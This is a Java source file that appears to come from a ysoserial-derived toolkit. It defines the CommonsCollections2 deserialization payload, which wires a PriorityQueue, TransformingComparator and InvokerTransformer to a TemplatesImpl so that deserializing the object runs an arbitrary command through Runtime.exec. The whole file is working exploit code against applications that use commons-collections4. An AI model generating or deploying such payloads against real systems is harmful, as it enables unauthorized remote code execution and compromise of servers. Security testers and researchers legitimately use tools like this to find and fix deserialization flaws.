package org.su18.ysuserial.payloads.gadgets;

import java.util.PriorityQueue;
import java.util.Queue;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.annotation.Authors;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;
import org.su18.ysuserial.payloads.util.Reflections;


/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({Authors.FROHOFF})
public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {

	public Queue<Object> getObject(final String command) throws Exception {
		final Object                templates   = Gadgets.createTemplatesImpl(command);
		final InvokerTransformer    transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
		final PriorityQueue<Object> queue       = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
		queue.add(1);
		queue.add(1);

		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
		Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

		return queue;
	}
}
